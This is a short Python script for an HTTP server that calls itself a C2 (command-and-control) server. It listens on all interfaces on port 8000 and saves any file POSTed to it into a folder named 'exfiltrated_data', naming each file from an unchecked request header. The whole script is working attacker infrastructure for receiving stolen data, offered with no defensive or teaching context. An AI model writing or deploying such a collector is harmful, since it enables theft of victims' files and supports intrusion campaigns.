from http.server import BaseHTTPRequestHandler, HTTPServer
import os

UPLOAD_FOLDER = "exfiltrated_data"
PORT = 8000

class SimpleC2Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        filename = self.headers.get('X-Filename', 'unknown.bin')

        data = self.rfile.read(content_length)

        os.makedirs(UPLOAD_FOLDER, exist_ok=True)
        file_path = os.path.join(UPLOAD_FOLDER, filename)
        with open(file_path, 'wb') as f:
            f.write(data)

        print(f"[+] Received: {filename}")
        self.send_response(200)
        self.end_headers()

if __name__ == "__main__":
    server = HTTPServer(('0.0.0.0', PORT), SimpleC2Handler)
    print(f"[+] C2 Server running on port {PORT}...")
    server.serve_forever()
